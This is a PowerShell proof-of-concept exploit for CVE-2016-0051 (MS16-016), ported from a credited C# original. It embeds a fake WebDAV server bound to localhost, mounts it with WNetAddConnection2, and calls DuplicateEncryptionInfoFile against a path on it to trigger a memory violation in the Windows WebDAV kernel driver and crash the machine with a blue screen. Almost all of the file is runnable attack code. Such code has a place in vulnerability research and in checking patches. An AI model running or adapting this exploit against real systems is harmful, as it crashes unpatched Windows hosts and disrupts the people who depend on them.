<# 
    CVE-2016-0051 (MS-016) : Get a BSOD by memory violation in Win* WebDAV kernel driver

    Based on Tamás Koczka (@koczkatamas)'s C# solution (in links).
    
    Original Author: Tamás Koczka (@koczkatamas)
    PowerShell Port: @pabraeken
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

#>
$source = @"
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

    public class BSOD
    {
        public static void StartFakeWebDavServer(int port)
        {
            new Thread(() =>
            {
                var server = new TcpListener(IPAddress.Loopback, port);
                server.Start();
                while (true)
                {
                    using (var client = server.AcceptTcpClient())
                    using (var stream = client.GetStream())
                    using (var reader = new StreamReader(stream, Encoding.GetEncoding("iso-8859-1")))
                    using (var writer = new StreamWriter(stream, Encoding.GetEncoding("iso-8859-1")) { AutoFlush = true })
                    {
                        Console.WriteLine(" =============== BEGIN REQUEST =============== ");

                        Func<string> rl = () =>
                        {
                            var line = reader.ReadLine();
                            Console.WriteLine("< " + line);
                            return line;
                        };

                        Action<string> wl = outData =>
                        {
                            Console.WriteLine(String.Join("\n", outData.Split('\n').Select(x => "> " + x)));
                            writer.Write(outData);
                        };

                        var header = rl().Split(' ');
                        while (!string.IsNullOrWhiteSpace(rl())) { }

                        if (header[0] == "OPTIONS")
                            wl("HTTP/1.1 200 OK\r\nMS-Author-Via: DAV\r\nDAV: 1,2,1#extend\r\nAllow: OPTIONS,GET,HEAD,PROPFIND\r\n\r\n");
                        else if (header[0] == "PROPFIND")
                        {
                            var body = String.Format(@"
                            <?xml version=""1.0"" encoding=""UTF-8""?>
                            <D:multistatus xmlns:D=""DAV:"">
                            <D:response>
                                <D:href>{0}</D:href>
                                <D:propstat>
                                    <D:prop>
                                        <D:creationdate>{1:s}Z</D:creationdate>
                                        <D:getcontentlength>{3}</D:getcontentlength>
                                        <D:getcontenttype>{4}</D:getcontenttype>
                                        <D:getetag>{5}</D:getetag>
                                        <D:getlastmodified>{6:R}</D:getlastmodified>
                                        <D:resourcetype>{8}</D:resourcetype>
                                        <D:supportedlock></D:supportedlock>
                                        <D:ishidden>{7}</D:ishidden>
                                    </D:prop>
                                    <D:status>HTTP/1.1 200 OK</D:status>
                                </D:propstat>
                            </D:response>
                            </D:multistatus>", header[1], DateTime.UtcNow.ToUniversalTime(), "", "0", "", "", DateTime.UtcNow.ToUniversalTime(), 0, header[1].Contains("file") ? "" : "<D:collection></D:collection>").Trim();

                            wl("HTTP/1.1 207 Multi-Status\r\nMS-Author-Via: DAV\r\nDAV: 1,2,1#extend\r\nContent-Length: " + body.Length + "\r\nContent-Type: text/xml\r\n\r\n" + body);
                        }
                        else
                            wl("HTTP/1.1 500 Internal Server Error\r\n\r\n");

                        Console.WriteLine(" =============== END REQUEST =============== ");
                    }
                }
            }) { IsBackground = true, Name = "WebDAV server thread" }.Start();
        }

        [StructLayout(LayoutKind.Sequential)]
        public class NETRESOURCE
        {
            public uint dwScope = 0;
            public uint dwType = 0;
            public uint dwDisplayType = 0;
            public uint dwUsage = 0;
            public string lpLocalName = null;
            public string lpRemoteName = null;
            public string lpComment = null;
            public string lpProvider = null;
        }

        [DllImport("mpr.dll")]
        public static extern int WNetAddConnection2(NETRESOURCE lpNetResource, string lpPassword, string lpUsername, int dwFlags);

        [DllImport("Advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int DuplicateEncryptionInfoFile(string srcFileName, string dstFileName, uint dwCreationDistribution, uint dwAttributes, IntPtr lpSecurityAttributes);        
    }
"@

Add-Type -TypeDefinition $source

$port = Get-Random -Minimum 1024 -Maximum 65535

[BSOD]::StartFakeWebDavServer($port)
$WNetAddConnection2WrapperSource = @'
using System;
using System.Runtime.InteropServices;

namespace Win32Api {
    [StructLayout(LayoutKind.Sequential)]
    public class NetResource {
        public uint dwScope = 0;
        public uint dwType = 0;
        public uint dwDisplayType = 0;
        public uint dwUsage = 0;
        public string lpLocalName = null;
        public string lpRemoteName = null;
        public string lpComment = null;
        public string lpProvider = null;
    };

    public static class NativeMethods {
        [DllImport("mpr.dll",  EntryPoint="WNetAddConnection2")]    
        public static extern int WNetAddConnection2(
            NetResource netResource, string lpPassword, string lpUsername, int dwFlags);
    }
}
'@
$advapi32MethodDefinition = @'
[DllImport("Advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
public static extern int DuplicateEncryptionInfoFile(
    string srcFileName, 
    string dstFileName, 
    uint dwCreationDistribution, 
    uint dwAttributes, 
    IntPtr lpSecurityAttributes);
'@

Add-Type -TypeDefinition $WNetAddConnection2WrapperSource 
$advapi32 = Add-Type -MemberDefinition $advapi32MethodDefinition -Name 'Advapi32' -Namespace 'Win32' -PassThru

$netResource = new-object Win32Api.NetResource
$netResource.lpRemoteName = ("\\127.0.0.1@$port\folder\")

$res = [Win32Api.NativeMethods]::WNetAddConnection2($netResource, 0, 0, $opts)


$duplicateEncryptionInfoResult = $advapi32::DuplicateEncryptionInfoFile("\\127.0.0.1@$port\folder\file", "x", 2, 128, [IntPtr]::Zero);